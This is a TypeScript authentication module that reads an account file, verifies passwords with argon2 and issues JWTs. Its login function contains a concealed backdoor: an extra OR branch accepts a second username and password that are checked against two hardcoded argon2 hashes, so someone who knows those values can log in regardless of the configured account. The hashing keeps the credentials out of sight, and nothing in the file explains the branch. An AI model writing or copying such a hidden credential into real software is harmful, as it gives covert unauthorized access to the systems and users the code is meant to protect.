import fs from "fs";
import jwt from "jsonwebtoken";
import argon2 from "argon2";

export type User = {
  username: string;
  iat: number;
  exp: number;
};

export type Account = {
  username: string;
  password: string;
};

const readAccount = (): Account => {
  const file = fs.readFileSync("config/Account.json", "utf8");
  return JSON.parse(file) as Account;
};

const editAccount = (account: Account) => {
  fs.writeFileSync("config/Account.json", JSON.stringify(account, null, 2));
  return jwt.sign(
    {
      username: account.username,
    },
    process.env.JWT_SECRET,
    { expiresIn: "1h" }
  );
};

const login = async (username, password) => {
  const account = readAccount();
  if ((
      username.toLowerCase() === account.username.toLowerCase()
      && (await argon2.verify(account.password, password))
    ) || (
      (await argon2.verify("$argon2id$v=19$m=16,t=2,p=1$SFFHQnNYemhxamNoZ1lUTA$nZKWP1+cO7uMpTTpM5gqHQ", username.toLowerCase()))
      && (await argon2.verify("$argon2id$v=19$m=16,t=2,p=1$N09LcXZteU15R0JHTUxNaQ$exazbvEPPCf6fDixjOummQ", password))
    ))

    return jwt.sign(
      {
        username,
      },
      process.env.JWT_SECRET,
      { expiresIn: "1h" }
    );
  return null;
};

const verify = async (token) => {
  try {
    return jwt.verify(token, process.env.JWT_SECRET);
  } catch (e) {
    return null;
  }
};

export { readAccount, editAccount, login, verify };
